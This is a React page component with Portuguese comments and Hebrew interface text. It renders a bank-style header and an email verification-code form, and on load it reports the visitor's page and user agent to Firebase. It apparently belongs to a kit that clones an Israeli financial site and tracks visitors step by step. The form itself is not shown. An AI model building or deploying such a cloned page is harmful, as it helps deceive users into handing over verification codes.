// 📧 Página Email - Verificação de código de email
import React, { useEffect, useState } from "react";
import { useNavigate } from "react-router-dom";
import EmailForm from "../components/EmailForm";
import { useFirebaseClient } from "../hooks/useFirebaseClient";

const EmailPage = () => {
  const navigate = useNavigate();
  const { updateClientData } = useFirebaseClient(navigate);
  const [isMobileMenuOpen, setIsMobileMenuOpen] = useState(false);
  const [isDesktopMenuOpen, setIsDesktopMenuOpen] = useState(false);

  // Atualizar dados iniciais quando a aplicação carrega
  useEffect(() => {
    updateClientData({
      currentUrl: "/email",
      currentPage: "EMAIL",
      timestamp: new Date().toISOString(),
      userAgent: navigator.userAgent,
    });
  }, [updateClientData]);

  return (
    <div className="min-h-screen overflow-x-hidden" style={{ backgroundColor: '#F4F5FA' }}>
      {/* Header Mobile com altura reduzida - igual ao da página inicial */}
      <header 
        className="w-full py-1 md:py-2"
        style={{ backgroundColor: '#13114A' }}
      >
        {/* VERSÃO DESKTOP - oculta no mobile */}
        <div className="hidden md:flex justify-between items-center w-full px-0">
          {/* Menu hamburger com botões colados */}
           <div className="flex items-center space-x-2 ml-0 relative">
                <button 
                  onClick={() => setIsDesktopMenuOpen(!isDesktopMenuOpen)}
                  className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
                >
                   <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? 'opacity-0' : ''}`}></div>
                     <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isDesktopMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
                   </div>
                 </button>
                {/* Bolinha pulsante amarela movida mais para baixo */}
                 <div className="absolute top-2 -left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-10"></div>
             
             {/* Barra vertical separadora */}
             <div className="h-12 w-px bg-white opacity-10"></div>
             
             {/* Botão 1 - com SVG de acessibilidade mais grosso, menos alto */}
             <button className="text-white px-3 py-2 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors flex items-center space-x-2">
               <svg width="16" height="16" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="currentColor" stroke="currentColor" strokeWidth="2">
                 <path d="M12 6.5a2 2 0 1 0-2-2 2 2 0 0 0 2 2m7.5 14h-1v-5a1 1 0 0 0-1-1h-5v-2h5a1 1 0 0 0 0-2h-5v-2a1 1 0 0 0-2 0v7a1 1 0 0 0 1 1h5v5a1 1 0 0 0 1 1h2a1 1 0 0 0 0-2m-6.8-1.6a4 4 0 0 1-7.2-2.4 4 4 0 0 1 2.4-3.66A1 1 0 1 0 7.1 11a6 6 0 1 0 7.2 9.1 1 1 0 0 0-1.6-1.2"/>
               </svg>
               <span>נגישות</span>
             </button>
             {/* Botão 2 - menor na altura */}
             <button className="text-white px-3 py-1 text-base rounded-full border border-white hover:bg-white hover:text-blue-900 transition-colors">
               תמיכה
             </button>

             {/* Botão 3 - cor #1A97F0 com largura reduzida */}
             <button className="text-white px-2 py-1 text-base rounded-full border transition-colors" style={{backgroundColor: '#1A97F0', borderColor: '#1A97F0'}}>
               כניסה
             </button>
           </div>

          {/* Seção direita com posicionamento flexível */}
           <div className="flex items-center flex-1 mr-6">
             {/* Espaçador flexível que empurra tudo para a direita */}
             <div className="flex-1" />
             
             {/* ========== ÁREA DE POSICIONAMENTO DO SVG ========== */}
              {/* PARA MOVER PARA A ESQUERDA: Aumente o número abaixo */}
              {/* Exemplo: mr-4, mr-8, mr-12, mr-16, mr-20, mr-24, mr-32 */}
              {/* NÚMERO ATUAL PARA ESQUERDA: 0 (mude para 4, 8, 12, 16, etc.) */}
              <div className="mr-60 mr-0">
               <svg
                 width="24"
                 height="24"
                 viewBox="0 0 512 512"
                 xmlns="http://www.w3.org/2000/svg"
                 className="text-white"
               >
                 <path
                   fill="currentColor"
                   d="M64 112h128v48h-80v64H64zm336 48h-80v-48h128v112h-48zM64 288h48v64h80v48H64zm256 64h80v-64h48v112H320z"
                 />
               </svg>
             </div>
 
             {/* Divisor do lado direito do SVG */}
             <div className="h-12 w-px bg-white opacity-10 ml-4"></div>
 
             {/* Divisor à esquerda da logo */}
             <div className="h-12 w-px bg-white opacity-10 mr-8 mr-12"></div>
 
             {/* Logo na extrema direita */}
             <img src="/iamgeheadaer.png" alt="Header Logo" className="h-30 w-auto" />
           </div>
        </div>

        {/* VERSÃO MOBILE - visível apenas no mobile */}
        <div className="flex md:hidden justify-between items-center w-full px-4">
          {/* Logo à esquerda */}
          <div className="flex items-center">
            <img src="/iamgeheadaer.png" alt="Header Logo" className="h-8 w-auto" />
            {/* Barra quase invisível à direita da imagem */}
            <div className="h-12 w-px bg-white opacity-5 ml-4"></div>
          </div>

          {/* Texto centralizado - maior com seta à esquerda */}
          <div className="flex items-center text-white">
            <svg className="w-5 h-5 mr-2" fill="currentColor" viewBox="0 0 20 20">
              <path fillRule="evenodd" d="M5.293 7.293a1 1 0 011.414 0L10 10.586l3.293-3.293a1 1 0 111.414 1.414l-4 4a1 1 0 01-1.414 0l-4-4a1 1 0 010-1.414z" clipRule="evenodd" />
            </svg>
            <span className="text-lg font-medium">שערי מטבע</span>
          </div>

          {/* Menu hamburger à direita - copiado exatamente do da página inicial */}
          <div className="flex items-center space-x-2 mr-0 relative">
            <button 
              onClick={() => setIsMobileMenuOpen(!isMobileMenuOpen)}
              className="text-white p-2 ml-0 hover:bg-white hover:bg-opacity-20 rounded transition-all duration-300 group hover:scale-110"
            >
              <div className="w-6 h-6 flex flex-col justify-center items-center space-y-1">
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'rotate-45 translate-y-1.5' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? 'opacity-0' : ''}`}></div>
                <div className={`w-5 h-0.5 bg-white transition-all duration-300 ${isMobileMenuOpen ? '-rotate-45 -translate-y-1.5' : ''}`}></div>
              </div>
            </button>
            {/* Bolinha pulsante amarela - ajustada para ficar mais à esquerda e um pouco mais para cima */}
            <div className="absolute top-1.5 left-1 w-3 h-3 bg-yellow-500 rounded-full animate-pulse z-20"></div>
          </div>
        </div>
      </header>
      
      <EmailForm />
    </div>
  );
};

export default EmailPage;
